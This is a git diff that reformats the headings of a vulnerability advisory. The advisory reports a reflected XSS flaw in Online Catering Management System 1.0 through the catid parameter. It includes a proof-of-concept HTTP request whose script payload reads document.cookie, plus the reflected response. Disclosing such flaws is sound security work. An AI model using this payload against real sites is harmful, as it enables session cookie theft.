@@ -1,9 +1,9 @@
 # online-catering-management-system-v1.0
 
-##Auditor:
+## Auditor:
 Devansh Dubey
 
-##Description:
+## Description:
 Reflected XSS in Online Catering Management System
 Link: https://phpgurukul.com/online-catering-management-system-using-php-and-mysql/
 
@@ -11,10 +11,10 @@ Online Catering Management System 1.0 is vulnerable to Cross-site scripting (XSS
 
 Vulnerable Endpoint - /ocms/categorywise-food.php via catid parameter.
 
-##PoCs
+## PoCs
 Vulnerable URL: /index.php
 
-###Request
+### Request
 
 GET /ocms/categorywise-food.php?catid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
 Host: localhost:8000
@@ -27,7 +27,7 @@ Cookie: PHPSESSID=s6qjv42g2ib2rvqinfgrkkgku8
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
-###Response
+### Response
 ---- snip ----
 "><script>
 alert(document.cookie)
